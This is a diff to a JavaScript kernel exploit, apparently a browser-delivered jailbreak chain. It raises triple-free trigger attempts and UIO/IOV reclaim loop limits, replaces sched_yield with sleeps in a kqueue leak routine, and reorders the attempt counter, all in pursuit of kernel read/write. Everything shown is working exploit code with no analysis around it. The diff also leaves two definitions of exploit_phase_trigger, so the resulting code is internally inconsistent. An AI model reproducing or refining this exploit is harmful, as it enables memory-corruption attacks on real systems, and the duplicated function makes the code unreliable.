@@ -118,7 +118,7 @@ var IPV6_SOCK_NUM = 96;
 var IOV_THREAD_NUM = 6;
 var UIO_THREAD_NUM = 6;
 var MAIN_LOOP_ITERATIONS = 3;
-var TRIPLEFREE_ITERATIONS = 6;
+var TRIPLEFREE_ITERATIONS = 10;
 var MAX_ROUNDS_TWIN = 10;
 var MAX_ROUNDS_TRIPLET = 100;
 var MAIN_CORE = 4;
@@ -1061,16 +1061,13 @@ function exploit_phase_trigger() {
   if (exploit_count >= MAIN_LOOP_ITERATIONS) {
     log('Max attempts reached — stopping.');
     cleanup();
-    exploit_end = true;
     return;
   }
-
-  exploit_count++;
-  log('Triggering attempt ' + exploit_count + '/' + MAIN_LOOP_ITERATIONS);
-
   let ok = false;
   try { ok = trigger_ucred_triplefree(); }
   catch(e) { ok = false; }
+  exploit_count++;
+  log('Triggering attempt ' + exploit_count + '/' + MAIN_LOOP_ITERATIONS);
 
   if (!ok) {
     log('Trigger failed — retrying...');
@@ -1079,6 +1076,21 @@ function exploit_phase_trigger() {
   }
 
   log('Leaking...');
+  yield_to_render(exploit_phase_leak);
+}
+function exploit_phase_trigger() {
+  if (exploit_count >= MAIN_LOOP_ITERATIONS) {
+    log('Failed to acquire kernel R/W');
+    cleanup();
+    return;
+  }
+  exploit_count++;
+  log('Triggering vulnerability (' + exploit_count + '/' + MAIN_LOOP_ITERATIONS + ')...');
+  if (!trigger_ucred_triplefree()) {
+    yield_to_render(exploit_phase_trigger);
+    return;
+  }
+  log('Leaking kqueue...');
   yield_to_render(exploit_phase_leak);
 }
 function exploit_phase_leak() {
@@ -1689,9 +1701,9 @@ function leak_kqueue() {
     // تصفير جزء من leak_rthdr قبل القراءة (لتفادي بقايا قديمة)
     write64(magic_add, 0);
     write64(leak_rthdr.add(0x98), 0);
-    
-    sched_yield(); // تهوية صغيرة قبل get_rthdr
 
+    nanosleep_fun(0.2);
+    
     get_rthdr(ipv6_socks[triplets[0]], leak_rthdr, 0x100);
 
     var magic = read64(magic_add);
@@ -1704,7 +1716,7 @@ function leak_kqueue() {
     close(kq);
     sched_yield();
   }
-  sched_yield();
+  nanosleep_fun(0.2);
   if (count >= MAX_KQ) {
     log('leak_kqueue: exceeded MAX_KQ iterations');
     return false;
@@ -1781,12 +1793,12 @@ function build_uio(uio, uio_iov, uio_td, read, addr, size) {
 // =========================
 
 // UIO reclaim max loops
-var KREAD_MAX_UIO_RECLAIM  = 1200;
-var KWRITE_MAX_UIO_RECLAIM = 1200;
+var KREAD_MAX_UIO_RECLAIM  = 5000;
+var KWRITE_MAX_UIO_RECLAIM = 5000;
 
 // IOV reclaim max loops
-var KREAD_MAX_IOV_RECLAIM  = 300;
-var KWRITE_MAX_IOV_RECLAIM = 300;
+var KREAD_MAX_IOV_RECLAIM  = 2000;
+var KWRITE_MAX_IOV_RECLAIM = 2000;
 
 // Memory exhaustion threshold
 var MEMORY_ZERO_THRESHOLD = 3;
